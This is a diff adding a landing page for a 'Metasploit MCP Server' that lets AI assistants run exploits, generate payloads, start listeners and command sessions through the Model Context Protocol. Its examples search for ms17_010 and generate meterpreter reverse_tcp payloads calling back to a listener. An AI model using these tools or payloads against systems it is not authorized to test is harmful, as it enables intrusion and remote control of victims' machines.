@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit MCP Server - Model Context Protocol for Security Testing</title>
+    <link rel="stylesheet" href="/static/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-brand">
+                <i class="fas fa-shield-alt"></i>
+                <span>Metasploit MCP Server</span>
+            </div>
+            <div class="nav-links">
+                <a href="#features">Features</a>
+                <a href="#tools">Tools</a>
+                <a href="#quickstart">Quick Start</a>
+                <a href="#api">API</a>
+                <a href="/docs" class="btn-docs">API Docs</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1 class="hero-title">
+                    <span class="gradient-text">Metasploit</span> meets 
+                    <span class="gradient-text">AI</span>
+                </h1>
+                <p class="hero-subtitle">
+                    Bridge the gap between AI assistants and penetration testing with the Model Context Protocol
+                </p>
+                <div class="hero-buttons">
+                    <a href="#quickstart" class="btn btn-primary">
+                        <i class="fas fa-rocket"></i> Get Started
+                    </a>
+                    <a href="https://github.com/your-repo/metasploit-mcp" class="btn btn-secondary">
+                        <i class="fab fa-github"></i> View on GitHub
+                    </a>
+                </div>
+                <div class="status-badge">
+                    <span class="status-indicator"></span>
+                    <span>Server Status: <span id="server-status">Checking...</span></span>
+                </div>
+            </div>
+            <div class="hero-graphic">
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <span class="terminal-dot red"></span>
+                        <span class="terminal-dot yellow"></span>
+                        <span class="terminal-dot green"></span>
+                        <span>MCP Server Console</span>
+                    </div>
+                    <pre class="terminal-body"><code class="language-javascript">// Connect to Metasploit via MCP
+const client = new MCPClient('http://your-server:8085');
+await client.connect();
+
+// Search for exploits
+const exploits = await client.callTool('list_exploits', {
+    search_term: 'ms17_010'
+});
+
+// Generate payload
+const payload = await client.callTool('generate_payload', {
+    payload_type: 'windows/meterpreter/reverse_tcp',
+    format_type: 'exe',
+    options: { LHOST: '10.0.0.1', LPORT: 4444 }
+});</code></pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="features">
+        <div class="container">
+            <h2 class="section-title">Powerful Features</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-plug"></i>
+                    </div>
+                    <h3>MCP Protocol</h3>
+                    <p>Built on Anthropic's Model Context Protocol for seamless AI integration</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-virus"></i>
+                    </div>
+                    <h3>Full Metasploit Access</h3>
+                    <p>Complete access to exploits, payloads, and post-exploitation modules</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <h3>Secure by Design</h3>
+                    <p>Built-in authentication, rate limiting, and secure headers</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-robot"></i>
+                    </div>
+                    <h3>AI-Ready</h3>
+                    <p>Compatible with Claude, GPT, and other AI assistants</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Tools Section -->
+    <section id="tools" class="tools">
+        <div class="container">
+            <h2 class="section-title">Available Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-category">
+                    <h3><i class="fas fa-search"></i> Discovery</h3>
+                    <ul>
+                        <li><code>list_exploits</code> - Search exploit modules</li>
+                        <li><code>list_payloads</code> - Browse available payloads</li>
+                        <li><code>list_active_sessions</code> - View active sessions</li>
+                        <li><code>list_listeners</code> - Check running handlers</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3><i class="fas fa-hammer"></i> Exploitation</h3>
+                    <ul>
+                        <li><code>run_exploit</code> - Execute exploit modules</li>
+                        <li><code>generate_payload</code> - Create custom payloads</li>
+                        <li><code>start_listener</code> - Set up handlers</li>
+                        <li><code>run_auxiliary_module</code> - Run aux modules</li>
+                    </ul>
+                </div>
+                <div class="tool-category">
+                    <h3><i class="fas fa-terminal"></i> Post-Exploitation</h3>
+                    <ul>
+                        <li><code>run_post_module</code> - Execute post modules</li>
+                        <li><code>send_session_command</code> - Run session commands</li>
+                        <li><code>terminate_session</code> - Close sessions</li>
+                        <li><code>stop_job</code> - Manage running jobs</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Quick Start Section -->
+    <section id="quickstart" class="quickstart">
+        <div class="container">
+            <h2 class="section-title">Quick Start Guide</h2>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Connect Your Client</h3>
+                    <p>Use any MCP-compatible client to connect to the server:</p>
+                    <pre><code class="language-javascript">// Using the MCP SDK
+import { Client } from '@modelcontextprotocol/sdk/client/index.js';
+import { SSEClientTransport } from '@modelcontextprotocol/sdk/client/sse.js';
+
+const transport = new SSEClientTransport(
+    new URL('http://your-server:8085/sse')
+);
+
+const client = new Client({
+    name: 'your-client',
+    version: '1.0.0'
+});
+
+await client.connect(transport);</code></pre>
+                </div>
+
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>List Available Tools</h3>
+                    <p>Discover all available Metasploit tools:</p>
+                    <pre><code class="language-javascript">const tools = await client.listTools();
+tools.tools.forEach(tool => {
+    console.log(`${tool.name}: ${tool.description}`);
+});</code></pre>
+                </div>
+
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Execute Tools</h3>
+                    <p>Call any tool with appropriate parameters:</p>
+                    <pre><code class="language-javascript">// Search for exploits
+const result = await client.callTool('list_exploits', {
+    search_term: 'apache'
+});
+
+// Generate a payload
+const payload = await client.callTool('generate_payload', {
+    payload_type: 'linux/x64/meterpreter/reverse_tcp',
+    format_type: 'elf',
+    options: {
+        LHOST: '10.0.0.1',
+        LPORT: 4444
+    }
+});</code></pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- API Section -->
+    <section id="api" class="api">
+        <div class="container">
+            <h2 class="section-title">API Endpoints</h2>
+            <div class="api-grid">
+                <div class="api-endpoint">
+                    <div class="endpoint-header">
+                        <span class="method get">GET</span>
+                        <code>/healthz</code>
+                    </div>
+                    <p>Check server health and Metasploit connection status</p>
+                </div>
+                <div class="api-endpoint">
+                    <div class="endpoint-header">
+                        <span class="method get">GET</span>
+                        <code>/sse</code>
+                    </div>
+                    <p>Server-Sent Events endpoint for MCP communication</p>
+                </div>
+                <div class="api-endpoint">
+                    <div class="endpoint-header">
+                        <span class="method post">POST</span>
+                        <code>/messages/</code>
+                    </div>
+                    <p>Send MCP messages to the server</p>
+                </div>
+                <div class="api-endpoint">
+                    <div class="endpoint-header">
+                        <span class="method get">GET</span>
+                        <code>/docs</code>
+                    </div>
+                    <p>Interactive API documentation (FastAPI)</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Configuration Section -->
+    <section class="config">
+        <div class="container">
+            <h2 class="section-title">Configuration</h2>
+            <div class="config-content">
+                <p>The server can be configured using environment variables:</p>
+                <pre><code class="language-bash"># Metasploit RPC Configuration
+MSF_PASSWORD=yourpassword      # RPC password
+MSF_SERVER=127.0.0.1          # RPC server address
+MSF_PORT=55553                # RPC port
+MSF_SSL=false                 # Use SSL for RPC
+
+# Server Configuration
+PAYLOAD_SAVE_DIR=/app/payloads  # Where to save generated payloads
+LOG_LEVEL=INFO                  # Logging level</code></pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h4>Metasploit MCP Server</h4>
+                    <p>Bridging AI and penetration testing through the Model Context Protocol</p>
+                    <div class="social-links">
+                        <a href="https://github.com"><i class="fab fa-github"></i></a>
+                        <a href="https://twitter.com"><i class="fab fa-twitter"></i></a>
+                        <a href="https://discord.com"><i class="fab fa-discord"></i></a>
+                    </div>
+                </div>
+                <div class="footer-section">
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="/docs">API Documentation</a></li>
+                        <li><a href="https://modelcontextprotocol.io">MCP Protocol</a></li>
+                        <li><a href="https://www.metasploit.com">Metasploit Framework</a></li>
+                        <li><a href="https://github.com">GitHub Repository</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Security Notice</h4>
+                    <p>This tool provides powerful exploitation capabilities. Use responsibly and only in authorized environments.</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 Metasploit MCP Server. Licensed under Apache 2.0</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="/static/script.js"></script>
+</body>
+</html> 
